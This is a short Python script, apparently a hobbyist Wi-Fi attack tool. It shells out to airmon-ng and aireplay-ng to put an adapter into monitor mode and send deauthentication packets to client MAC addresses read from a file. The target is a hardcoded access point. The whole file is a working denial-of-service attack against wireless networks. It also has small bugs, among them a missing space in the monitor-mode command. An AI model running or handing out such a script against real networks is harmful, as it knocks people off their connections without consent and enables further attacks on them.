import os
import re
import threading


class Wifi:
    def __init__(self):
        self.mac_list = []
        self.adapter = 'wlan1'

    def find_adapter(self):
        command = os.popen('sudo ifconfig')
        command_output = command.read()
        wlan_find = re.findall('\s*wlan\d', command_output)
        adapter = wlan_find[1]
        print(self.adapter)
        self.adapter = adapter.strip()
        return self.adapter

    def find_macs(self):
        mac_file = str(input('Please Enter The FIle Contain Mac_Address => '))
        with open(mac_file, 'r') as mac_file:
            mac_list = []
            for line in mac_file.readlines():
                line = line.strip()
                mac_list.append(line)
            self.mac_list = mac_list
        return self.mac_list

    def start_moniter_mode(self):
        command = 'sudo airmon-ng start' + self.adapter
        start = os.popen(command)
        return start

    def de_authentic(self, mac):
        for address in mac:
            print('Sent Dauth Packted To The MAC : ' + address)
            command = 'sudo aireplay-ng -0 1 -a C8:3A:35:96:A8:49  -c ' + address + ' ' + self.adapter + 'mon'
            command = command.strip()
            command = os.popen(command)
            command.read()


    def de_auth_all(self):
        thread = threading.Thread(target=self.de_authentic, args=[self.mac_list])
        thread.start()
        # for mac_address in range(len(self.mac_list)):
        #     print(mac_address)
        #     # mac_address = threading.Thread(target=self.de_authentic, args=self.mac_list[mac_address])
        #     # mac_address.start()


if __name__ == '__main__':
    wifi = Wifi()
    # wifi.find_adapter()
    wifi.find_macs()
    # wifi.start_moniter_mode()
    wifi.de_auth_all()
